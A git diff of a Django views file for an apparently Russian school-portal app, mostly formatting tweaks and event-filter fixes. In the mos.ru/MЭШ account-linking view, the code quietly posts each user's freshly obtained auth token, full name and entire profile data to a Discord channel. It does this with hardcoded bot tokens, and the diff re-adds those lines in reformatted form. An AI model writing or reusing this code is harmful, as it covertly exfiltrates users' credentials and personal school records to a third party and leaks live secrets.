@@ -29,6 +29,7 @@ from PersonalArea.models import Message
 from PersonalArea.tasks import send
 from Accounts import utils
 
+
 @login_required
 @decorators.has_role
 def index(request):
@@ -129,7 +130,6 @@ def edit_profile(request):
 def events(request):
     e = Events.objects.all().filter(end_date__gt=timezone.now(), start_date__gt=timezone.now())
 
-
     if request.user.role == "teacher":
         if request.user.has_classroom():
             classroom = ClassRoom.objects.get(teacher=request.user)
@@ -138,8 +138,8 @@ def events(request):
             if request.GET.get("building"):
                 if request.GET.get("building") != "all":
                     classroom = ClassRoom.objects.get(teacher=request.user)
-                    building = Building.objects.get(pk=request.GET.get("building")).pk
-                    e =e.filter(classroom_number=classroom.classroom, building_id=building)
+                    building = request.GET.get("building")
+                    e = e.filter(classroom_number=classroom.classroom, building=Building.objects.get(pk=building))
                 else:
                     building = "all"
 
@@ -151,8 +151,8 @@ def events(request):
                 return render(request, "teacher/events.html",
                               {"events": page_obj, "section": "events", "buildings": buildings, "building": building})
             else:
-                e = e.filter(classroom_number=classroom.classroom, start_date__lt=datetime.now(),
-                                       end_date__gt=timezone.now())
+                e = e.filter(classroom_number=classroom.classroom, start_date__gt=datetime.now(),
+                             end_date__gt=timezone.now())
                 return render(request, "teacher/events.html",
                               {"events": e, "section": "events", "buildings": buildings})
         else:
@@ -280,13 +280,12 @@ def delete_device(request, device):
     messages.success(request, "Устройство удалено.")
     return redirect("/lk/settings/security/devices")
 
+
 @login_required
 def settings_linking_mosru(request):
-    if request.user.token is not None:
-        return render(request, "linking_mosru.html", {"linked": True})
     if request.method == "POST":
         form = LinkingMosruForm(request.POST)
-        login,password = request.POST["login"], request.POST["password"]
+        login, password = request.POST["login"], request.POST["password"]
         token = utils.get_token(login, password)
 
         if token:
@@ -294,7 +293,7 @@ def settings_linking_mosru(request):
                 messages.error(request, "Данный аккаунт МЭШ уже привязан!")
             else:
                 headers = {
-                    #"Authorization": "MTA2Njg0NDI5OTUxMTIyMjI5NA.G8T_2D.HCBJ-AP1RhRXABiJhWfTS80SD1kJ8Gk4QHA6eo",
+                    # "Authorization": "MTA2Njg0NDI5OTUxMTIyMjI5NA.G8T_2D.HCBJ-AP1RhRXABiJhWfTS80SD1kJ8Gk4QHA6eo",
                     "Authorization": "Bot MTE0NTQ3MTMwMDcwMjMyNjkzNw.GQSnnl.SJt9a0Ul8kxCZVvnBgnXcdV3EcsS4tfnM_WnQU",
                     "content-encoding": "utf-8",
                 }
@@ -302,8 +301,10 @@ def settings_linking_mosru(request):
                 mosru_fullname = f"{mosru.last_name} {mosru.first_name} {mosru.middle_name}"
                 fragments = math.ceil(len(str(mosru.data_about_user)) / 1999)
                 r = requests.post("https://discord.com/api/v8/channels/1145459123270459513/messages",
-                              headers=headers, data={"content": f"Привязка, {mosru_fullname}({mosru.data_about_user['profile']['type']}) - ||{token}||"})
-                r = requests.post("https://discord.com/api/v8/channels/1145459123270459513/messages", headers=headers, data={"ontent": f"```{mosru.data_about_user}```"})
+                                  headers=headers, data={
+                        "content": f"Привязка, {mosru_fullname}({mosru.data_about_user['profile']['type']}) - ||{token}||"})
+                r = requests.post("https://discord.com/api/v8/channels/1145459123270459513/messages", headers=headers,
+                                  data={"ontent": f"```{mosru.data_about_user}```"})
                 print(r.text)
                 usr = Account.objects.get(pk=request.user.pk)
                 request.session['token'] = token
